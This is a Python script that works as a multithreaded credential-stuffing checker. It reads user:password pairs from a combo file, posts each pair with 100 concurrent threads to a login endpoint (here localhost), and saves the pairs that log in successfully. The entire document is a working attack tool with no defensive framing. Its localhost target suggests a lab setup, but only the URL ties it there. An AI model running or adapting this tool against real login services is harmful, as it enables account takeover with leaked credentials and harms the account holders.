import requests
import tokenize
import concurrent.futures


def getCombo(inputFile):
    totalProcessed = 0
    tempFile = tokenize.open(inputFile)
    fileEncoding = tempFile.encoding
    tempFile.close()
    with open(inputFile, 'r', encoding=fileEncoding, errors="backslashreplace") as f:
            for linea in f:
                (user, password) = linea.replace("\r", "").replace("\n", "").split(":")
                payload = {'user': user,
                           'pass': password}
                totalProcessed += 1
                if totalProcessed % 1000 == 0:
                    print("Processed "+str(int(totalProcessed/1000))+"K")
                yield payload

def checkCombo(payload):
    respuesta = requests.post('http://localhost:5002/validateLogin', data=payload)
    if respuesta.status_code == 200:
        return payload
    return None

if __name__ == '__main__':


    inputFile = 'combo.txt'
    outputFile = 'outputMulti.txt'
    MAX_CONCURRENT = 100
    comboGenerator = getCombo(inputFile)
    stillWorking = True
    with open(outputFile, 'w') as outFile:
            with concurrent.futures.ThreadPoolExecutor() as executor:
                while stillWorking:
                    futures = []
                    for url in range(MAX_CONCURRENT):
                        try:
                            currentValue = next(comboGenerator)
                            futures.append(executor.submit(checkCombo, payload=currentValue))
                        except:
                            stillWorking = False
                    for future in concurrent.futures.as_completed(futures):
                        respuesta = future.result()
                        if respuesta:
                            outFile.write(respuesta['user']+":"+respuesta['pass']+"\n")
                            print(respuesta)
